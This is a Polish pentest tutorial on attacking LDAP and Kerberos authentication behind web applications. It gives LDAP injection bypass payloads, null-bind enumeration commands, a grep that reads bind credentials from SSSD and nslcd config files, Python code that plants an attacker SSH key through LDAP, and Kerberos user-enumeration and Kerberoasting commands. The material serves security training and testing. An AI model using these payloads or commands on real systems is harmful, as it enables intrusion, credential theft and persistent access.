# LDAP i Kerberos -- Infrastruktura uwierzytelniania aplikacji webowych

## Wstep

Wiele aplikacji webowych korzysta z LDAP lub Kerberos jako backendu uwierzytelniania.
Ponizszy material opisuje techniki istotne z perspektywy pentestera aplikacji webowych --
od LDAP injection, przez anonimowy dostep, po ataki na Kerberos w kontekscie SSO.

---

## 1. LDAP -- kontekst webowy

### 1.1 LDAP Injection w aplikacjach webowych

Aplikacje webowe czesto buduja zapytania LDAP dynamicznie na podstawie danych od uzytkownika
(formularze logowania, wyszukiwarki pracownikow, systemy resetowania hasel).
Jesli dane nie sa odpowiednio walidowane, mozliwe jest wstrzykniecie fragmentow filtra LDAP.

**Typowe wektory:**
- Formularze logowania: `(&(uid=USER_INPUT)(userPassword=PASS_INPUT))`
- Wyszukiwarki katalogu: `(cn=USER_INPUT)`
- Filtry autocomplete/AJAX: `(mail=USER_INPUT*)`

**Przyklady payloadow:**
```
# Bypass uwierzytelniania (zamkniecie filtra i dodanie warunku zawsze prawdziwego)
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*

# Enumeracja atrybutow (blind LDAP injection)
*)(uid=admin)(|(cn=a*    -> rozna odpowiedz niz cn=z*
```

**Kluczowe znaki specjalne LDAP do testowania:**
`*`, `(`, `)`, `\`, `NUL` (0x00), `/`

### 1.2 Anonimowy dostep (null/anonymous bind)

Wiele serwerow LDAP (szczegolnie starsze instalacje Active Directory) pozwala na anonimowe bindowanie.
Pozwala to atakujacemu enumerowac uzytkownikow, grupy, polityki hasel -- dane przydatne do ataku
na aplikacje webowa (password spraying, targetowane phishing).

```bash
# Testowanie anonimowego dostepu
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<DOMENA>,DC=<TLD>"

# Enumeracja z NetExec (null bind)
netexec ldap <DC_FQDN> -u '' -p '' --query "(sAMAccountName=*)" ""
```

**Co szukac w kontekscie webowym:**
- `sAMAccountName` / `userPrincipalName` -- nazwy uzytkownikow do testowania logowania w aplikacji
- `memberOf` -- grupy (np. admini aplikacji)
- `pwdLastSet` -- wzorce czasowe przydatne do password sprayingu
- Atrybut `mail` -- adresy do atakow phishingowych / password reset

### 1.3 Dane uwierzytelniajace w konfiguracji klienta LDAP

Na serwerach linuxowych hostujacych aplikacje webowe moga znajdowac sie pliki konfiguracyjne
z poswiadczeniami bind w postaci jawnej:

```bash
# Kluczowe pliki
/etc/sssd/sssd.conf
/etc/nslcd.conf
/etc/ldap/ldap.conf
/etc/krb5.conf

# Szukanie poswiadczen
grep -nE '^(ldap_uri|ldap_default_bind_dn|ldap_default_authtok)' \
  /etc/sssd/sssd.conf /etc/nslcd.conf 2>/dev/null
```

Jesli plik `sssd.conf` lub `nslcd.conf` jest world-readable, poswiadczenia bind moga
zostac wykorzystane do pelnej enumeracji katalogu.

### 1.4 Modyfikacja klucza SSH przez LDAP

Jesli aplikacja webowa lub infrastruktura korzysta z kluczy SSH przechowywanych w LDAP
(atrybut `sshPublicKey`), a mamy uprawnienia zapisu -- mozemy dodac wlasny klucz publiczny
i uzyskac dostep SSH do serwera hostujacego aplikacje:

```python
import ldap3
server = ldap3.Server('x.x.x.x', port=636, use_ssl=True)
connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
connection.modify('uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN',
    {'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3...klucz_atakujacego'])]})
```

### 1.5 Podsluchiwianie poswiadczen LDAP

Jesli LDAP jest uzyty bez SSL (port 389), poswiadczenia przesylane sa jawnym tekstem.
Atak MITM moze tez wymusic downgrade z LDAPS do LDAP.

---

## 2. Kerberos -- kontekst webowy (SSO, tokeny)

### 2.1 Znaczenie dla aplikacji webowych

Aplikacje webowe w srodowiskach Active Directory czesto korzystaja z Kerberos do:
- **SSO (Single Sign-On)** -- uzytkownik zalogowany do domeny automatycznie uwierzytelnia sie w aplikacji
- **Delegacja Kerberos** -- serwer aplikacji podszywa sie pod uzytkownika do baz danych/backendow
- **SPNs** -- kazda aplikacja webowa ma Service Principal Name, ktory moze byc celem Kerberoastingu

### 2.2 Konfiguracja klienta (przydatna przy pivotingu)

Po uzyskaniu dostepu do sieci wewnetrznej, mozna skonfigurowac klienta Kerberos
aby uzyskac dostep do wewnetrznych aplikacji webowych chronionych SSO:

```bash
# Synchronizacja czasu (wymagana!)
sudo ntpdate <dc.fqdn>

# Generowanie krb5.conf
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# Pobranie TGT
kinit <user>
klist

# SSH z GSSAPI (dostep do serwera webowego)
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```

### 2.3 MS14-068 -- falszywe uprawnienia Domain Admin

Atak MS14-068 pozwala sfabrykowac token Kerberos z uprawnieniami Domain Admin.
W kontekscie webowym -- uzyskanie uprawnien DA moze dac pelny dostep do
kazdej aplikacji w domenie.

### 2.4 Enumeracja userow przez Kerberos (pre-auth)

```bash
# Enumeracja nazw uzytkownikow (bez poswiadczen!)
nmap -p 88 --script=krb5-enum-users \
  --script-args krb5-enum-users.realm="DOMENA.LOCAL",userdb=users.txt <IP>

# Kerberoasting -- wyciaganie hashy SPN
GetUserSPNs.py -request -dc-ip <IP> domena.local/uzytkownik
```

Wyciagniete hashy moga byc lamane offline -- jesli SPN naleza do kont serwisowych
aplikacji webowych, uzyskujemy bezposredni dostep.

---

## 3. Kluczowe wnioski dla pentestera webowego

| Wektor | Wplyw na aplikacje webowa |
|--------|--------------------------|
| LDAP Injection | Bypass logowania, enumeracja danych, odczyt atrybutow |
| Anonymous LDAP bind | Enumeracja userow do password sprayingu w aplikacji |
| Poswiadczenia bind w plikach | Pelny dostep do katalogu -> eskalacja uprawnien |
| Kerberoasting | Lamanie hasel kont serwisowych aplikacji |
| Kerberos SSO misconfig | Podszywanie sie pod uzytkownikow w aplikacji |
| LDAP bez SSL | Przechwycenie poswiadczen uzytkownikow aplikacji |
